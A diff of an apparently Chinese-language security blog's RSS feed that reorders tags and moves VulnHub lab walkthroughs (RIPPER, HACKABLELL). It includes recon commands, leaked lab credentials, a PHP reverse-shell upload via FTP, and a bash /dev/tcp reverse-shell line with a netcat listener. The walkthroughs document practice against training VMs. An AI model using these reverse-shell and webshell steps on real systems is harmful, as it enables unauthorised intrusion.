@@ -7,45 +7,45 @@
         <language>zh-CN</language>
         <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
         <lastBuildDate>Mon, 01 Nov 2021 00:00:00 +0800</lastBuildDate>
-        <category>ENTJ</category>
-        <category>ENTP</category>
-        <category>ESFP</category>
         <category>ENFJ</category>
-        <category>ESTJ</category>
-        <category>ENFP</category>
-        <category>INFJ</category>
+        <category>ESFP</category>
+        <category>ENTP</category>
         <category>ESFJ</category>
+        <category>ENFP</category>
+        <category>ENTJ</category>
+        <category>ESTJ</category>
         <category>ESTP</category>
-        <category>INFP</category>
         <category>INTJ</category>
-        <category>ISFJ</category>
+        <category>INFJ</category>
+        <category>INFP</category>
         <category>INTP</category>
-        <category>ISTJ</category>
-        <category>ISTP</category>
+        <category>ISFJ</category>
         <category>ISFP</category>
+        <category>ISTP</category>
+        <category>ISTJ</category>
         <category>MBTI</category>
         <category>心理测试</category>
         <category>渗透测试</category>
         <category>Linux</category>
         <category>信息安全网址</category>
         <category>Trojan</category>
-        <category>人生</category>
-        <category>成长</category>
-        <category>人生哲学</category>
-        <category>生命</category>
-        <category>命运</category>
-        <category>意义</category>
-        <category>社会</category>
-        <category>神学</category>
-        <category>人性</category>
-        <category>历史</category>
-        <category>爱情</category>
-        <category>道德</category>
         <category>VULNHUB 1-10</category>
         <category>VULNHUB 11-20</category>
         <category>VULNHUB 21-30</category>
         <category>VULNHUB 31-40</category>
         <category>VULNHUB 41-50</category>
+        <category>生命</category>
+        <category>人生</category>
+        <category>成长</category>
+        <category>意义</category>
+        <category>人生哲学</category>
+        <category>命运</category>
+        <category>神学</category>
+        <category>历史</category>
+        <category>社会</category>
+        <category>人性</category>
+        <category>爱情</category>
+        <category>道德</category>
         <item>
             <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/122%20FUNBOX10/</guid>
             <title>VULNHUB 22 FUNBOX10</title>
@@ -121,92 +121,6 @@ target_url=“&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjgu
 &lt;p&gt;看到有个计划任务被执行，查看后发现其中有一串 base64 加密数据，&lt;/p&gt;
 &lt;img data-src=&#34;/N1h1l157/VULNHUB/image-523.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
 &lt;p&gt;-&amp;gt; 解密后发现是 root 的密码，su root 提权成功&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/121%20RIPPER/</guid>
-            <title>VULNHUB 21 RIPPER</title>
-            <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/121%20RIPPER/</link>
-            <category>VULNHUB 21-30</category>
-            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcmlwcGVyLTEsNzA2Lw==&#34;&gt;https://www.vulnhub.com/entry/ripper-1,706/&lt;/span&gt;&lt;br&gt;
- 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTQ3ODE2L2FydGljbGUvZGV0YWlscy8xMjMzMzI1ODI=&#34;&gt;https://blog.csdn.net/qq_42947816/article/details/123332582&lt;/span&gt;&lt;/p&gt;
-&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
-&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
- 靶机 RIPPER：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
-&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
- &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-480.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.84&lt;/p&gt;
-&lt;p&gt;2）确认靶机 ip 开放的端口信息&lt;br&gt;
- &lt;code&gt;sudo nmap -p- 192.168.31.115&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-481.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 靶机开放端口 22,80,10000&lt;/p&gt;
-&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
-&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODQ=&#34;&gt;http://192.168.31.84&lt;/span&gt; 进行信息收集&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-482.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.84&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-483.png&#34; width=&#34;340&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;没有什么新发现，先不管 80 端口的 web&lt;br&gt;
- 查看网站:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODQ6MTAwMDA=&#34;&gt;http://192.168.31.84:10000&lt;/span&gt; 进行信息收集&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-484.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;提示会跳转到 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAw&#34;&gt;https://ripper-min:10000&lt;/span&gt;&lt;br&gt;
- 修改本地 hosts 文件，将 url 地址改为目标靶机 ip 地址&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-485.png&#34; width=&#34;290&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;进入到页面 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAw&#34;&gt;https://ripper-min:10000&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-486.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;一个 webmin 的登陆页面，收集此网站的相关信息&lt;/p&gt;
-&lt;h3 id=&#34;robots-页面查看&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#robots-页面查看&#34;&gt;#&lt;/a&gt; robots 页面查看&lt;/h3&gt;
-&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAwL3JvYm90cy50eHQ=&#34;&gt;https://ripper-min:10000/robots.txt&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-487.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;找到一个提示，采用的 base64 加密，解密后得到一个关键词 “rips”&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-488.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;直接将 rips 拿到谷歌上搜索，它是一个做代码分析的工具&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-489.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;进入到 rips 官网得知，其安装下载之后的目录在 /rips/ 里边&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-490.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;在原来的 url 地址上拼接上 rips 看是否能有新发现:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAwL3JpcHM=&#34;&gt;https://ripper-min:10000/rips&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-491.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 此页面并没有任何反应，别忘了我们还有一个 80 端口&lt;/p&gt;
-&lt;h3 id=&#34;rip-扫描-web&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rip-扫描-web&#34;&gt;#&lt;/a&gt; rip 扫描 web&lt;/h3&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly8xOTIuMTY4LjMxLjg0L3JpcHMv&#34;&gt;https://192.168.31.84/rips/&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-492.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;进入到了 rips 代码审计的界面，看样子需要填一个 path，根据要求填写为 /var/www 后点击扫描&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-493.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;扫描到了一些漏洞，并且看到了一个敏感文件 secret.php，点击 secret.php 文件&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-494.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 得到了泄漏出来的账户和密码 ripper:Gamespeop&lt;/p&gt;
-&lt;h3 id=&#34;可访问文件筛选&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#可访问文件筛选&#34;&gt;#&lt;/a&gt; 可访问文件筛选&lt;/h3&gt;
-&lt;p&gt;爆出来的密码可能是 ssh 连接的密码，也可能是网站后台密码，通过 ssh 连接判断是否能登陆到对方的服务器上&lt;br&gt;
- &lt;code&gt;ssh 192.168.31.84 -l ripper&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-495.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 成功拿到 ripper 的权限，尝试去拿 root 账户的权限&lt;/p&gt;
-&lt;p&gt;查询目录结构，看到出了 ripper 之外的另外一个用户 cubes&lt;br&gt;
- 查看出了基础的几个基本目录后，是否有其他文件是这两个用户能操作的&lt;br&gt;
- &lt;code&gt;find / -user ripper 2&amp;gt;/dev/null | grep -v “proc\|home\|run\|sys”&lt;/code&gt; &lt;br&gt;
- &lt;code&gt;find / -user cubes 2&amp;gt;/dev/null | grep -v “home”&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-496.png&#34; width=&#34;610&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;发现 cubes 可以操作的文件有一个 secret.file 文件，查看后得到密码&lt;br&gt;
- su cubes 输入密码后成功拿到了 cubes 的权限&lt;/p&gt;
-&lt;p&gt;借助 find 来寻找属于用户 cubes 可以操作的文件&lt;br&gt;
- &lt;code&gt;find / -user cubes 2&amp;gt;/dev/null | grep -v “home\|proc”&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-497.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;备份文件泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#备份文件泄露&#34;&gt;#&lt;/a&gt; 备份文件泄露&lt;/h3&gt;
-&lt;p&gt;&lt;code&gt;cat /var/webmin/backup/miniser.log&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-498.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 找到了敏感信息 webmin 的账户和密码：admin:tokiohotel&lt;/p&gt;
-&lt;p&gt;进入 webmin 的网站后台登陆地址，输入账户密码进入后台 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAw&#34;&gt;https://ripper-min:10000&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-499.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;在后台中发现有个 terminal 的标志，直接点击此按钮&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-500.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;后台反弹-shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#后台反弹-shell&#34;&gt;#&lt;/a&gt; 后台反弹 shell&lt;/h3&gt;
-&lt;p&gt;点击后在 web 页面就会弹出来一个终端窗口，而且是 root 权限的&lt;/p&gt;
-&lt;p&gt;但是在 web 界面操作并不是很方遍，接下来把此 shell 进行反弹&lt;br&gt;
- &lt;code&gt;bash - c ‘bash -I &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1’&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-501.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;接受反弹的shell，并且美化终端&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;quot;import pty;pty.spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-502.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 最后拿到了一个 root 账户的标准 shell&lt;/p&gt;
  ]]></description>
         </item>
         <item>
@@ -361,6 +275,149 @@ john: Sup3r&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#3
  运行此命令时因为 kali 机器是在 M1 的 mac 电脑上搭建的，属于 aarch，不同于 windows 的 amd64 系统，因此编译失败了&lt;/p&gt;
 &lt;img data-src=&#34;/N1h1l157/VULNHUB/image-563.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
 &lt;p&gt;-&amp;gt; Lxd 提权失败了，需要一台 amd64 的机器进行编译此文件&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/124%20HACKABLELL/</guid>
+            <title>VULNHUB 24 HACKABLELL</title>
+            <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/124%20HACKABLELL/</link>
+            <category>VULNHUB 21-30</category>
+            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja2FibGUtaWksNzExLw==&#34;&gt;https://www.vulnhub.com/entry/hackable-ii,711/&lt;/span&gt;&lt;br&gt;
+ 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY4NzYyMS9hcnRpY2xlL2RldGFpbHMvMTE5Mzg2Njgz&#34;&gt;https://blog.csdn.net/weixin_44687621/article/details/119386683&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
+&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
+ 靶机 HACKABLELL：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
+&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
+ &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-564.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.6&lt;/p&gt;
+&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
+ &lt;code&gt;sudo nmap -p- 192.168.31.6&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-565.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 靶机开放端口 21,22,80&lt;/p&gt;
+&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
+&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAyLw==&#34;&gt;http://192.168.31.102/&lt;/span&gt; 进行信息收集&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-566.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.6&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-567.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;只看到了一个目录，是 files 文件夹，直接访问此链接: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNi9maWxlcy8=&#34;&gt;http://192.168.31.6/files/&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-568.png&#34; width=&#34;330&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;查看此文件指向地址的详细内容:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNi9maWxlcy9DQUxMLmh0bWw=&#34;&gt;http://192.168.31.6/files/CALL.html&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-569.png&#34; width=&#34;300&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;审查源代码，查看更多的关键信息&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-571.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;网站信息收集之后没有什么关键的信息&lt;/p&gt;
+&lt;h3 id=&#34;ftp-匿名下载上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-匿名下载上传&#34;&gt;#&lt;/a&gt; FTP 匿名下载上传&lt;/h3&gt;
+&lt;p&gt;对 ftp 做检查，检测 ftp 服务上是否存在弱口令，是否能搜集到关键信息&lt;/p&gt;
+&lt;p&gt;ftp 192.168.31.6&lt;br&gt;
+get CALL.html&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-572.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;将 CALL.html 文件下载之后查阅，发现和 web 服务是同样的代码&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-573.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;可以控制 ftp 服务向靶机发送 payload，判断是否能上传到网站&lt;br&gt;
+ &lt;code&gt;cp /usr/share/webshells/php/php-reverse-shell.php .&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;修改监听 ip 地址和端口号为攻击机&lt;br&gt;
+ &lt;code&gt;cat shell.php | head -n 55 | tail -n 10&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;连接 ftp，put shell.php 上传文件，打开网址发现 exp 上传成功&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-574.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;点击运行即可成功收到会话，也可以上传一句话木马，使用蚁剑连接&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-575.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;md5-解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#md5-解密&#34;&gt;#&lt;/a&gt; MD5 解密&lt;/h3&gt;
+&lt;p&gt;查看目录下 important.txt 文件，发现根目录有可执行脚本，运行一下&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-577.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;解密这个 md5，得到 onion。猜测这是 ssh 的登录密码&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-578.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;sudopython3提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudopython3提权&#34;&gt;#&lt;/a&gt; sudo (python3) 提权&lt;/h3&gt;
+&lt;p&gt;su shrek 依靠 onion 密码登陆 ssh 成功&lt;br&gt;
+这里使用 python 进行提权，得到 root 身份运行的 shell&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-579.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/121%20RIPPER/</guid>
+            <title>VULNHUB 21 RIPPER</title>
+            <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/121%20RIPPER/</link>
+            <category>VULNHUB 21-30</category>
+            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcmlwcGVyLTEsNzA2Lw==&#34;&gt;https://www.vulnhub.com/entry/ripper-1,706/&lt;/span&gt;&lt;br&gt;
+ 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTQ3ODE2L2FydGljbGUvZGV0YWlscy8xMjMzMzI1ODI=&#34;&gt;https://blog.csdn.net/qq_42947816/article/details/123332582&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
+&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
+ 靶机 RIPPER：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
+&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
+ &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-480.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.84&lt;/p&gt;
+&lt;p&gt;2）确认靶机 ip 开放的端口信息&lt;br&gt;
+ &lt;code&gt;sudo nmap -p- 192.168.31.115&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-481.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 靶机开放端口 22,80,10000&lt;/p&gt;
+&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
+&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODQ=&#34;&gt;http://192.168.31.84&lt;/span&gt; 进行信息收集&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-482.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.84&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-483.png&#34; width=&#34;340&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;没有什么新发现，先不管 80 端口的 web&lt;br&gt;
+ 查看网站:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODQ6MTAwMDA=&#34;&gt;http://192.168.31.84:10000&lt;/span&gt; 进行信息收集&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-484.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;提示会跳转到 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAw&#34;&gt;https://ripper-min:10000&lt;/span&gt;&lt;br&gt;
+ 修改本地 hosts 文件，将 url 地址改为目标靶机 ip 地址&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-485.png&#34; width=&#34;290&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;进入到页面 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAw&#34;&gt;https://ripper-min:10000&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-486.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;一个 webmin 的登陆页面，收集此网站的相关信息&lt;/p&gt;
+&lt;h3 id=&#34;robots-页面查看&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#robots-页面查看&#34;&gt;#&lt;/a&gt; robots 页面查看&lt;/h3&gt;
+&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAwL3JvYm90cy50eHQ=&#34;&gt;https://ripper-min:10000/robots.txt&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-487.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;找到一个提示，采用的 base64 加密，解密后得到一个关键词 “rips”&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-488.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;直接将 rips 拿到谷歌上搜索，它是一个做代码分析的工具&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-489.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;进入到 rips 官网得知，其安装下载之后的目录在 /rips/ 里边&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-490.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;在原来的 url 地址上拼接上 rips 看是否能有新发现:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAwL3JpcHM=&#34;&gt;https://ripper-min:10000/rips&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-491.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 此页面并没有任何反应，别忘了我们还有一个 80 端口&lt;/p&gt;
+&lt;h3 id=&#34;rip-扫描-web&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rip-扫描-web&#34;&gt;#&lt;/a&gt; rip 扫描 web&lt;/h3&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly8xOTIuMTY4LjMxLjg0L3JpcHMv&#34;&gt;https://192.168.31.84/rips/&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-492.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;进入到了 rips 代码审计的界面，看样子需要填一个 path，根据要求填写为 /var/www 后点击扫描&lt;/p&gt;
